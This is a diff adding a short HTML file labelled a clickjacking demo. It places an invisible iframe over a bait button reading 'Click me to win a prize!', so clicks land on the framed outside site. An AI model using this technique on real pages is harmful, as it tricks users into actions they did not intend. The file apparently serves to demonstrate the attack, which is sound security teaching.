@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Clickjacking Demo with Iframe</title>
+    <style>
+        #innocentButton {
+            position: absolute;
+            top: 50px;
+            left: 50px;
+            z-index: 1;
+        }
+
+        #hiddenIframe {
+            position: absolute;
+            top: 50px;
+            left: 50px;
+            z-index: 2;
+            opacity: 0;
+            width: 200px;
+            height: 200px;
+        }
+    </style>
+</head>
+<body>
+    <button id="innocentButton">Click me to win a prize!</button>
+    <iframe id="hiddenIframe" src="https://libraryofbabel.info/"></iframe>
+</body>
+</html>
